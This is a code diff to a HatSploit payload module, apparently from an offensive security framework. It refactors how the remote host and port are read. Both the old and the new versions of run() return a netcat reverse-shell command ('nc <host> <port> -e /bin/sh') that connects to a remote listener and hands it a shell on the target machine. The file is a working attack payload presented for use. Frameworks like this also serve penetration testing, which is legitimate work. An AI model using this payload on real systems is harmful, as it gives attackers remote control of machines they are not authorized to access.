@@ -3,7 +3,7 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 
 
 class HatSploitPayload(Payload):
@@ -24,8 +24,5 @@ class HatSploitPayload(Payload):
         }
 
     def run(self):
-        remote_host = self.handler['RHOST']
-        remote_port = self.handler['RPORT']
-
-        payload = f"nc {remote_host} {remote_port} -e /bin/sh"
+        payload = f"nc {self.rhost.value} {self.rport.value} -e /bin/sh"
         return payload
